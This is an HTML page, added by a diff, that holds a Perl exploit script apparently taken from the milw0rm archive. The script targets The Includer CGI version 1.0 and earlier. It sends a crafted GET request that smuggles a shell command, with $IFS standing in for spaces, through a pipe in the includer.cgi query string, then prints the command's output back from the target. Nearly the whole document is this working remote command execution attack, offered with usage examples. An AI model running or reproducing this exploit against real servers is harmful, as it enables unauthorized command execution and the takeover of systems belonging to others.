@@ -1,0 +1,74 @@
+<html>
+<head>
+<title>The Includer CGI <= 1.0 Remote Command Execution (new version)</title>
+<pre>
+                                                                                                                                                                                                                                                               #!/usr/bin/perl
+
+############################################################
+# Target - The Includer CGI &lt;= 1.0                         #
+#                                                          #
+# Based on - http://www.milw0rm.com/id.php?id=862          #
+#                                                          #
+# Info about bug - Stupid use &quot;Open&quot; function.             #
+#                                                          #
+############################################################
+# If you want know more visit our home page at nst.void.ru #
+############################################################
+use IO::Socket;
+
+
+if (@ARGV &lt; 3)
+{
+  print &quot; \n Includer CGI &lt;= 1.0 Network Security Team - nst.void.ru\n\n&quot;;
+  print &quot; Usage: &lt;target&gt; &lt;dir&gt; &lt;cmd&gt;\n\n&quot;; 
+  print &quot;   &lt;host&gt; - Host name of taget.\n&quot;;
+  print &quot;   &lt;dir&gt; - If not in dir type / symbol.\n&quot;;
+  print &quot;   &lt;cmd&gt; - command for execution.\n\n&quot;;
+  print &quot; Examples:\n\n&quot;;
+  print &quot;   incl_10.pl 127.0.0.1 /cgi-bin/ \&quot;ls -la\&quot;\n&quot;;
+  print &quot;   incl_10.pl 127.0.0.1 / \&quot;uname -a\&quot;\n&quot;;
+  print &quot;   incl_10.pl www.test.com / \&quot;ps auxw\&quot;\n&quot;;
+  exit();
+}
+
+
+$serv = $ARGV[0];
+$serv =~ s/http:\/\///ge;
+
+$dir = $ARGV[1];
+$cmd = $cmde = $ARGV[2];
+  
+print &quot;\n ===[ Info for query ]========================\n&quot;;   
+print &quot; = Target: $serv\n&quot;;
+print &quot; = Dir: $dir\n&quot;;
+print &quot; = Cmd: $cmd\n&quot;;
+print &quot; =============================================\n\n&quot;;   
+
+$cmde =~ s/ /&quot;\$IFS&quot;/ge;
+
+$req  = &quot;GET http://$serv&quot;;                                      
+$req .= &quot;$dir&quot;;
+$req .= &quot;includer.cgi?|echo\$IFS\&quot;_N_\&quot;;$cmde;echo\$IFS\&quot;_T_\&quot;| HTTP/1.0\n\n&quot;;
+
+
+$s = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,
+                           PeerAddr=&gt;&quot;$serv&quot;,
+                           PeerPort=&gt;80) or die &quot; (-) - Can't connect to the server\n&quot;;
+
+print $s $req;
+
+$flag = 0;
+
+while ($ans = &lt;$s&gt;)
+
+ {
+   if ($ans =~ /_T_/) { print &quot; =========================================================\n&quot;; exit() }
+   if ($flag == 1) { print &quot; $ans&quot;; }
+   if ($ans =~ /^_N_/) { print &quot; ===[ Executed command $cmd ]===============================\n&quot;; $flag = 1 }
+   
+ }
+
+# milw0rm.com [2005-04-08]
+</pre>
+</html>
+
